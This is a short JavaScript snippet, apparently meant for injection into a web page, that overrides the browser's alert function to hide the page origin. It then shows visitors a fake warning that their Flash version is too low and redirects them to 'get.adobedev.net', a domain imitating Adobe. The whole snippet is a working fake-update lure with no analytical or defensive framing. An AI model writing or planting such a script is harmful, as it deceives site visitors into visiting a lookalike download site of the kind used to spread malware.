window.alert = function(name){
var iframe = document.createElement("IFRAME");
iframe.style.display="none";
iframe.setAttribute("src", 'data:text/plain,');
document.documentElement.appendChild(iframe);
window.frames[0].window.alert(name);
iframe.parentNode.removeChild(iframe);
}
alert("Your flash version is too low, please visit this page after trying to upgrade!");
window.location.href = "https://get.adobedev.net/";